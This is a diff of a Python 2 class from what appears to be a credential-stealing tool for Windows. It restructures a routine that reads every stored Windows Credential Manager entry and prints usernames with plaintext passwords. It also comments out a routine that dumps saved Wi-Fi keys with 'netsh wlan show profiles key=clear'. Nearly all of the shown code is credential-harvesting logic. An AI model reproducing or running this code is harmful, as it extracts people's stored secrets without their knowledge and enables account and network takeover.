@@ -108,37 +108,36 @@ class decypt():
 
         CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
         CredRead = win32cred.CredRead
-        try:
-            creds = win32cred.CredEnumerate(None, 0)  # Enumerate credentials
-            credentials = []
-            for package in creds:
+        creds = win32cred.CredEnumerate(None, 0)  # Enumerate credentials
+        credentials = []
+        for package in creds:
+            try:
                 target = package['TargetName']
                 creds = CredRead(target, CRED_TYPE_GENERIC)
                 credentials.append(creds)
-            values = {}
-            for cred in credentials:
-                values['service'] = cred['TargetName']
-                values['UserName'] = cred['UserName']
-                values['pwd'] = cred['CredentialBlob'].decode('utf16')
-            print values
-        except Exception:
-            pass
-
-    def decrypt_using_netsh(self):
-        print_success("Attempt to get system WiFi password")
-        try:
-            values = []
-            process = os.popen('netsh wlan show profiles').read()
-            wifi_name = re.findall(':\s+.+', str(process))
-            for wifi in wifi_name:
-                wifi_ = wifi.replace(': ', '')
-                key = os.popen('netsh wlan show profiles "{}" key=clear'.format(wifi_)).read()
-                _password = re.findall('(?<=Key Content\s\s\s\s\s\s\s\s\s\s\s\s:)[\s\S]*(?=\n\nCost)', str(key))
-                if _password:
-                    _wifi = 'SSID' + ":" + str(wifi_) + "|" + "PAssword" + ":" + str(_password)
-                    values.append(_wifi)
-            print values
-        except Exception:
-            pass
+            except Exception:
+                pass
+        values = {}
+        for cred in credentials:
+            values['service'] = cred['TargetName']
+            values['UserName'] = cred['UserName']
+            values['pwd'] = cred['CredentialBlob'].decode('utf16')
+        print values
 
 
+    # def decrypt_using_netsh(self):
+    #     print_success("Attempt to get system WiFi password")
+    #     try:
+    #         values = []
+    #         process = os.popen('netsh wlan show profiles').read()
+    #         wifi_name = re.findall(':\s+.+', str(process))
+    #         for wifi in wifi_name:
+    #             wifi_ = wifi.replace(': ', '')
+    #             key = os.popen('netsh wlan show profiles "{}" key=clear'.format(wifi_)).read()
+    #             _password = re.findall('(?<=Key Content\s\s\s\s\s\s\s\s\s\s\s\s:)[\s\S]*(?=\n\nCost)', str(key))
+    #             if _password:
+    #                 _wifi = 'SSID' + ":" + str(wifi_) + "|" + "PAssword" + ":" + str(_password)
+    #                 values.append(_wifi)
+    #         print values
+    #     except Exception:
+    #         pass
